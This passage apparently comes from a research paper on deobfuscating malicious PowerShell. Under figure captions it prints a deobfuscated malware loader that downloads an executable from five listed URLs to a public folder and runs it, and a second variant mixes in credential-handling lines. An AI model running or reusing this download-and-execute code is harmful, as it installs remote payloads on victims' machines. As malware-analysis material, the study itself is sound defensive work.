+
+
+                Figure 11: An intermediate deobfuscating result (removed the first layer of obfuscation)
+
+$nsadasd = new-object random;
+$YYU = new-object System.Net.WebClient;
+$NSB = $nsadasd.next(10000, 282133);
+$ADCX = '
+http://quote.freakget.com/wpcontent/rCk5/@http://www.lightchasers.in/Mwmg/@http://casastoneworks.com.au/9ARR4/@http:
+//jasclair.com/scI8YTL/@http://convivialevent.fr/IoVWm/'.Split('@');
+$SDC = "C:\User\Public\89955.exe";
+foreach($asfc in $ADCX)
+{
+try
+{
+$YYU.DoWnlOadFIle($asfc.ToStriNg(), $SDC);
+Invoke-Item ($SDC);
+break;
+}catch{}
+}
+
+
+             Figure 12: The deobfuscated malware sample with our subtree-based deobfuscation approach
+
+$nsadasd = new-object random;
+$YYU = new-object System.Net.WebClient;
+$NSB = $nsadasd.next(10000, 282133);
+$MountShare = $True
+$SecurePassword = $Password | ConvertTo-SecureString -AsPlainText -Force
+$Credential = New-Object System.Management.Automation.PSCredential($UserName, $SecurePassword)
+$commonArgs['Credential'] = $Credential
+$ADCX = '
+http://quote.freakget.com/wpcontent/rCk5/@http://www.lightchasers.in/Mwmg/@http://casastoneworks.com.au/9ARR4/
+@http://jasclair.com/scI8YTL/@http://convivialevent.fr/IoVWm/'.Split('@');
+$SDC = "C:\User\Public\89955.exe";
+$SecurePassword = $Password | ConvertTo-SecureString -AsPlainText -Force
+$Credential = New-Object System.Management.Automation.PSCredential($UserName, $SecurePassword)
+$commonArgs['Credential'] = $Credential
+foreach($asfc in $ADCX)
+{ try {
+$YYU.DoWnlOadFIle($asfc.ToStriNg(), $SDC);
+Invoke-Item ($SDC);
+break; }catch{} }
+
+
+
+                                        Figure 13: An example of mixed scripts
+
